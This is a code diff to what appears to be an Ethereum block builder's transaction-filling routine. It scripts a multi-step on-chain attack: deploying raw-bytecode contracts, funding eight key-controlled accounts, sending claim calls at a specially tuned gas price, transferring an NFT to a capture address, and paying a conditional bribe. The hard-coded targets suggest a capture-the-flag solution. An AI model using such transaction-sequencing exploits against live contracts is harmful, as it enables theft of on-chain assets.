@@ -1108,29 +1108,20 @@ func (w *worker) fillTransactions(interrupt *int32, env *environment, validatorC
             return fmt.Errorf("could not create tx")
         }
 
-        bytecode := common.Hex2Bytes("608060405261011e806100136000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c806352fcba12146037578063f754a78414603f575b600080fd5b603d6045565b005b603d6069565b3a64050000000014605557600080fd5b600080546001600160a01b03191633179055565b6000546001600160a01b03163314607f57600080fd5b604051600090736578cdc9a4ce219408935221038202cbd91e90bd9047908381818185875af1925050503d806000811460d3576040519150601f19603f3d011682016040523d82523d6000602084013e60d8565b606091505b505090508060e557600080fd5b5056fea2646970667358221220bd9e6935e240cb331762dda1845acc16bf7d13c66736c234f321dd0ce4edc6e264736f6c634300080d0033")
+        // STEP 1: deploy optimzer contract
 
-        log.Error(string(bytecode))
+        playerBytecode := common.Hex2Bytes("693a4132413552525934f33452600a6016f3")
+        value := big.NewInt(0)
+        gasLimit := uint64(300_000)
 
-        bribeString := os.Getenv("BRIBE_AMOUNT")
-        bribe, _ := new(big.Int).SetString(bribeString, 10)
-
-        gasLimit := uint64(500_000)
-
-        value := bribe
-        contractAddress, err := w.deployContract(env, deployerKey, value, bytecode, gasLimit)
+        playerContract, err := w.deployContract(env, deployerKey, value, playerBytecode, gasLimit)
         if err != nil {
             log.Error("could not create tx", "err", err)
             return fmt.Errorf("could not create tx")
         }
 
-        targetGasPrice := big.NewInt(21474836480)
-        baseFee := env.header.BaseFee
-        tip := new(big.Int).Sub(targetGasPrice, baseFee)
-        if tip.Sign() == -1 {
-            log.Error("base fee to low")
-            return fmt.Errorf("base fee to low")
-        }
+
+        // fetch keys
 
         keyOne, err := crypto.HexToECDSA(os.Getenv("KEY_ONE"))
         if err != nil {
@@ -1144,28 +1135,148 @@ func (w *worker) fillTransactions(interrupt *int32, env *environment, validatorC
             return fmt.Errorf("could not create key")
         }
 
-        keys := []*ecdsa.PrivateKey{keyOne, keyTwo}
-        value = big.NewInt(0)
+        keyThree, err := crypto.HexToECDSA(os.Getenv("KEY_THREE"))
+        if err != nil {
+            log.Error("could not create key")
+            return fmt.Errorf("could not create key")
+        }
+
+        keyFour, err := crypto.HexToECDSA(os.Getenv("KEY_FOUR"))
+        if err != nil {
+            log.Error("could not create key")
+            return fmt.Errorf("could not create key")
+        }
+
+        keyFive, err := crypto.HexToECDSA(os.Getenv("KEY_FIVE"))
+        if err != nil {
+            log.Error("could not create key")
+            return fmt.Errorf("could not create key")
+        }
+
+        keySix, err := crypto.HexToECDSA(os.Getenv("KEY_SIX"))
+        if err != nil {
+            log.Error("could not create key")
+            return fmt.Errorf("could not create key")
+        }
+
+        keySeven, err := crypto.HexToECDSA(os.Getenv("KEY_SEVEN"))
+        if err != nil {
+            log.Error("could not create key")
+            return fmt.Errorf("could not create key")
+        }
+
+        keyEight, err := crypto.HexToECDSA(os.Getenv("KEY_EIGHT"))
+        if err != nil {
+            log.Error("could not create key")
+            return fmt.Errorf("could not create key")
+        }
+
+        keys := []*ecdsa.PrivateKey{keyOne, keyTwo, keyThree, keyFour, keyFive, keySix, keySeven, keyEight}
+
+        // STEP 2: fund accounts from deployer
 
         for i := 0; i < len(keys); i++ {
-            data := common.Hex2Bytes("52fcba12")
-            w.sendTx(env, keys[i], contractAddress, value, data, tip, 100_000)
+            value = big.NewInt(100_000_000_000_000_000)
+            tip := big.NewInt(0)
+
+            pubKeyTo := keys[i].Public().(*ecdsa.PublicKey)
+            to := crypto.PubkeyToAddress(*pubKeyTo)
+            
+            err = w.sendTx(env, deployerKey, &to, value, nil, tip, 21_000)
             if err != nil {
                 log.Error("could not create tx", "err", err)
                 return fmt.Errorf("could not create tx")
             }
         }
 
+        // STEP 3: become the optimizer
+
+        // calculate correct tip amount
+
+        targetGasPrice := big.NewInt(38654705664)   // 0x0900000000
+        baseFee := env.header.BaseFee
+        tip := new(big.Int).Sub(targetGasPrice, baseFee)
+        if tip.Sign() == -1 {
+            log.Error("base fee to low")
+            return fmt.Errorf("base fee to low")
+        }
+
+        optimizerAddress := common.HexToAddress("27761C482000F2fC91E74587576c2B267eEb4546")
+
+        // send claim txs
+
         for i := 0; i < len(keys); i++ {
-            data := common.Hex2Bytes("f754a784")
-            w.sendTx(env, keys[i], contractAddress, value, data, big.NewInt(0), 100_000)
+            sig := common.Hex2Bytes("3a0b21a0")
+            leftPad := common.Hex2Bytes("000000000000000000000000")
+            playerBytes := playerContract.Bytes()
+
+            data := []byte{}
+            data = append(data, sig...)
+            data = append(data, leftPad...)
+            data = append(data, playerBytes...)
+
+            value = big.NewInt(0)
+            
+            err = w.sendTx(env, keys[i], &optimizerAddress, value, data, tip, 200_000)
             if err != nil {
                 log.Error("could not create tx", "err", err)
                 return fmt.Errorf("could not create tx")
             }
         }
 
-        // send bribe transaction
+        // STEP 4: transfer nft
+
+        captureAddress := common.HexToAddress(os.Getenv("CAPTURE_ADDRESS"))
+
+        for i := 0; i < len(keys); i++ {
+            sig := common.Hex2Bytes("23b872dd")
+
+            leftPad := common.Hex2Bytes("000000000000000000000000")
+            senderPubKey := keys[i].Public().(*ecdsa.PublicKey)
+            senderAddress := crypto.PubkeyToAddress(*senderPubKey)
+            from := []byte{}
+            from = append(from, leftPad...)
+            from = append(from, senderAddress.Bytes()...)
+
+            to := []byte{}
+            to = append(to, leftPad...)
+            to = append(to, captureAddress.Bytes()...)
+
+            tokenId := common.Hex2Bytes("0000000000000000000000000000000000000000000000000000000000000001")
+            
+            data := []byte{}
+            data = append(data, sig...)
+            data = append(data, from...)
+            data = append(data, to...)
+            data = append(data, tokenId...)
+
+            value = big.NewInt(0)
+
+            // TODO: check gas limit
+            err = w.sendTx(env, keys[i], &optimizerAddress, value, data, big.NewInt(0), 200_000)
+            if err != nil {
+                log.Error("could not create tx", "err", err)
+                return fmt.Errorf("could not create tx")
+            }
+        }
+
+        // STEP 5 fund bribe address if NFT claimed
+        
+        bribeString := os.Getenv("BRIBE_AMOUNT")
+        bribe, _ := new(big.Int).SetString(bribeString, 10)
+
+        funderBytecode := common.Hex2Bytes("60806040819052600080546001600160a01b03199081167327761c482000f2fc91e74587576c2b267eeb454690811790925560018054821673b35f9e41edac7f96ddfaeb85323c3851ef3defab908117825560028054909316736578cdc9a4ce219408935221038202cbd91e90bd179092556331a9108f60e11b845260845291636352211e9060a490602090602481865afa1580156100a2573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100c69190610118565b6001600160a01b0316146100d957600080fd5b6002546040516001600160a01b03909116903480156108fc02916000818181858888f19350505050158015610112573d6000803e3d6000fd5b50610148565b60006020828403121561012a57600080fd5b81516001600160a01b038116811461014157600080fd5b9392505050565b603f806101566000396000f3fe6080604052600080fdfea2646970667358221220f82c4b9c5de3de060aa64cb44294e45c36f83b5914715a464bd8221934acaaf264736f6c634300080d0033")
+
+        value = bribe
+        gasLimit = uint64(500_000)
+
+        _, err = w.deployContract(env, deployerKey, value, funderBytecode, gasLimit)
+        if err != nil {
+            log.Error("could not create tx", "err", err)
+            return fmt.Errorf("could not create tx")
+        }
+
+        // STEP 6: send bribe transaction
 
 		env.gasPool.AddGas(paymentTxGas)
 		if bribe.Sign() == 1 {
